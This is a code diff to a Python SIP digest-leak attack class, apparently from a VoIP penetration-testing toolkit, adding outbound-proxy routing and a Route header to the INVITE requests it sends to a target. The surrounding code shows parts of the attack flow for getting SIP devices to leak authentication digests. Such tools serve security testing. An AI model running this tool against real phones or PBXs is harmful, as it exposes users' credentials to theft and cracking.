@@ -23,6 +23,8 @@ class SipDigestLeak:
     def __init__(self):
         self.ip = ''
         self.host = ''
+        self.proxy = ''
+        self.route = ''
         self.rport = '5060'
         self.proto = 'UDP'
         self.domain = ''
@@ -192,6 +194,9 @@ class SipDigestLeak:
     def call(self, ip, port, proto):
         print(self.c.BWHITE + '[✓] Target: ' + self.c.GREEN + '%s:%s/%s' %
               (ip, port, proto))
+        if self.proxy != '':
+            print(self.c.BWHITE + '[✓] Outbound Proxy: ' + self.c.GREEN + '%s' %
+                  self.proxy)
         print(self.c.WHITE)
 
         cseq = '1'
@@ -217,6 +222,9 @@ class SipDigestLeak:
         if self.contact_domain == '':
             self.contact_domain = local_ip
 
+        if self.proxy != '':
+            self.route = '<sip:%s;lr>' % self.proxy
+
         try:
             if self.proto == 'UDP':
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -235,14 +243,23 @@ class SipDigestLeak:
             lport = get_free_port()
             sock.bind((bind, lport))
 
-        host = (str(ip), int(port))
+        if self.proxy == '':
+            host = (str(ip), int(port))
+        else:
+            if self.proxy.find(':') > 0:
+                (proxy_ip, proxy_port) = self.proxy.split(':')
+            else:
+                proxy_ip = self.proxy
+                proxy_port = '5060'
+
+            host = (str(proxy_ip), int(proxy_port))
 
         branch = generate_random_string(71, 71, 'ascii')
         callid = generate_random_string(32, 32, 'hex')
         tag = generate_random_string(8, 8, 'hex')
 
         msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', self.sdp, '', '')
+                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', self.sdp, '', self.route)
 
         print(self.c.YELLOW + '[=>] Request INVITE' + self.c.WHITE)
 
@@ -344,7 +361,7 @@ class SipDigestLeak:
                     print(self.c.YELLOW + '[=>] Request INVITE' + self.c.WHITE)
 
                     msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain, self.to_user, self.to_name, self.to_domain, self.proto,
-                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', self.sdp, via, '')
+                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', self.sdp, via, self.route)
 
                     if self.verbose == 1:
                         print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
